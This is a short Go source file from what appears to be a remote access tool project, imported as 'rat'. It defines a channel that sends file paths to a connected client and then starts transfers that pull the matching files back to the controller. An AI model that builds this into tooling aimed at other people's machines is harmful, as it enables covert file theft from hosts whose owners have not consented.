package main

import (
	"encoding/binary"
	"io"
	"rat/shared"
	"rat/shared/network/header"
)

type ChannelQueryFiles struct {
	Paths []string
}

func (ChannelQueryFiles) Header() header.PacketHeader {
	return header.ChannelQueryFilesHeader
}

func (ch ChannelQueryFiles) Open(r io.ReadWriteCloser, c *Client) error {
	var err error
	binary.Write(r, binary.LittleEndian, int32(len(ch.Paths)))

	for _, path := range ch.Paths {
		shared.WriteString(r, path)
	}

	var len int32
	err = binary.Read(r, binary.LittleEndian, &len)

	for i := 0; i < int(len); i++ {
		abspath, _ := shared.ReadString(r)
		var len int64
		binary.Read(r, binary.LittleEndian, &len)
		_, _ = shared.ReadString(r)

		t := NewTransfer(abspath, len, true)
		t.Start(c, nil)
	}

	return err
}
